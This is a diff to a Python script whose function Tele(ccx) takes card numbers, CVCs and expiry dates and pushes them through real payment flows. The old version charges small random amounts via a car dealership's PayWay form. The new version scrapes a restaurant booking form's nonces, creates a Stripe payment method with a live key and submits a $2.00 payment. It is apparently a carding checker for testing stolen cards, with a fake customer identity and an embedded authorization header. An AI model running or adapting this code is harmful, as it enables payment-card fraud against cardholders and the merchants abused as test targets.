@@ -10,14 +10,12 @@ def Tele(ccx):
 		yy = yy.split("20")[1]
 	r = requests.session()
 
-	random_amount1 = random.randint(1, 9)
-	random_amount2 = random.randint(1, 99)
-
 	headers = {
-	    'authority': 'www.penfold.com.au',
+	    'authority': 'couqley.ae',
 	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
 	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
-	    'referer': 'https://www.google.com/',
+	    'cache-control': 'max-age=0',
+	    'referer': 'https://couqley.ae/group-booking/',
 	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
@@ -29,40 +27,41 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 	}
 	
-	response = requests.get('https://www.penfold.com.au/online-payment', headers=headers)
+	response = requests.get('https://couqley.ae/group-booking/', headers=headers)
 	
-	merchant_id = re.search(r'\\"merchant_id\\":\\"(.*?)\\"', response.text).group(1)
+	__fluent_form_embded_post_id = re.search(r"name='__fluent_form_embded_post_id' value='(.*?)'", response.text).group(1)
+	_fluentform_7_fluentformnonce = re.search(r'name="_fluentform_7_fluentformnonce" value="(.*?)"', response.text).group(1)
+	form_id = re.search(r'form data-form_id="(.*?)"', response.text).group(1)
 	
 	headers = {
-	    'authority': 'www.penfold.com.au',
+	    'authority': 'api.stripe.com',
 	    'accept': 'application/json',
 	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
-	    'content-type': 'text/plain;charset=UTF-8',
-	    'origin': 'https://www.penfold.com.au',
-	    'referer': 'https://www.penfold.com.au/online-payment',
+	    'content-type': 'application/x-www-form-urlencoded',
+	    'origin': 'https://js.stripe.com',
+	    'referer': 'https://js.stripe.com/',
 	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
 	    'sec-fetch-dest': 'empty',
 	    'sec-fetch-mode': 'cors',
-	    'sec-fetch-site': 'same-origin',
+	    'sec-fetch-site': 'same-site',
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 	}
 	
-	data = '{"lead":{"dealership_slug":"559","website_slug":"penfold","url":"https://www.penfold.com.au/online-payment","source":"Website","user_agent":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36","invoice_reference":"1","name":"Rodam User","amount":"'+str(random_amount1)+'.'+str(random_amount2)+'","email":"rodamuser08@gmail.com","phone":"6148 008 945","leadStatus":"Incomplete","form_completed":false,"category":"General Enquiry","subcategory":"Incomplete Payment","visited_pages":["/online-payment"],"linked_query_params":{}}}'
+	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2Fca98f11090%3B+stripe-js-v3%2Fca98f11090%3B+card-element&key=pk_live_51Mt7dzJqVFarYYzkkoB1jYzy4Ww7asPvFDmExt6qaF0JMR0zSKnT9dFWvsr9gh7SJC5k8cPRuygTHlhy2rXYu7tD00TryATqUc'
 	
-	response = requests.post('https://www.penfold.com.au/api/leads', headers=headers, data=data)
+	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 	
-	id = response.json()['id']
+	pm = response.json()['id']
 	
 	headers = {
-	    'authority': 'api.payway.com.au',
-	    'accept': 'application/json',
+	    'authority': 'couqley.ae',
+	    'accept': '*/*',
 	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
-	    'authorization': 'Basic UTQwNzcxX1BVQl9ycmVlNzNzZXp3aHNxdWNtZ2twNzIyNmQ0cXB2ZGhiaWhqNnJ0ZXViMmg5Mnh1YXduNDk2NDZtM2VkOGs6',
 	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    'origin': 'https://api.payway.com.au',
-	    'referer': 'https://api.payway.com.au/rest/v1/creditCard-iframe.htm',
+	    'origin': 'https://couqley.ae',
+	    'referer': 'https://couqley.ae/group-booking/',
 	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
@@ -70,62 +69,19 @@ def Tele(ccx):
 	    'sec-fetch-mode': 'cors',
 	    'sec-fetch-site': 'same-origin',
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
-	    'x-no-authenticate-basic': 'true',
 	    'x-requested-with': 'XMLHttpRequest',
 	}
 	
+	params = {
+	    't': '1746301908304',
+	}
+	
 	data = {
-	    'paymentMethod': 'creditCard',
-	    'connectionType': 'FRAME',
-	    'cardNumber': f'{n}',
-	    'cvn': f'{cvc}',
-	    'cardholderName': 'Dao Khao Saard',
-	    'expiryDateMonth': f'{mm}',
-	    'expiryDateYear': f'{yy}',
-	    'threeDS2': 'false',
+	    'data': f'__fluent_form_embded_post_id={__fluent_form_embded_post_id}&_fluentform_7_fluentformnonce={_fluentform_7_fluentformnonce}&_wp_http_referer=%2Fgroup-booking%2F&names%5Bfirst_name%5D=Rodam&names%5Blast_name%5D=User&email=rodamuser08%40gmail.com&phone=4303000850&dropdown_1=Birthday%20Celebration&dropdown=Couqley&no_of_people=12&datetime=31%2F05%2F2025%2012%3A00%20PM&food_package=179&drinks_package=0&payment_options=Free%20Cancellation%202%20weeks&grand_total=2148&grand_total_1=179&custom-payment-amount_1=2.00&payment_method=stripe&food_canape%5B%5D=&checkbox%5B%5D=&food_coffee%5B%5D=&__stripe_payment_method_id={pm}',
+	    'action': 'fluentform_submit',
+	    'form_id': f'{form_id}',
 	}
 	
-	response = requests.post('https://api.payway.com.au/rest/v1/single-use-tokens', headers=headers, data=data)
-	
-	tok = response.json()['singleUseTokenId']
-	
-	headers = {
-	    'authority': 'www.penfold.com.au',
-	    'accept': '*/*',
-	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
-	    'content-type': 'application/json',
-	    'origin': 'https://www.penfold.com.au',
-	    'referer': 'https://www.penfold.com.au/online-payment',
-	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
-	    'sec-ch-ua-mobile': '?1',
-	    'sec-ch-ua-platform': '"Android"',
-	    'sec-fetch-dest': 'empty',
-	    'sec-fetch-mode': 'cors',
-	    'sec-fetch-site': 'same-origin',
-	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
-	}
-	
-	json_data = {
-	    'dealership_slug': '559',
-	    'custom_amount': ''+str(random_amount1)+'.'+str(random_amount2)+'',
-	    'customer': {
-	        'email': 'rodamuser08@gmail.com',
-	    },
-	    'token': tok,
-	    'merchant_id': merchant_id,
-	    'order': {
-	        'number': id,
-	    },
-	}
-	
-	response = requests.post(
-	    'https://www.penfold.com.au/api/frizelle-st-george-payment',
-	    headers=headers,
-	    json=json_data,
-	)
-	
-	x = response.text
-	result = re.search(r'"status":"(.*?)"', x)
-	result = result.group(1)
-	
-	return (result)
+	response = requests.post('https://couqley.ae/wp-admin/admin-ajax.php', params=params, headers=headers, data=data)
+
+	return (response.text)
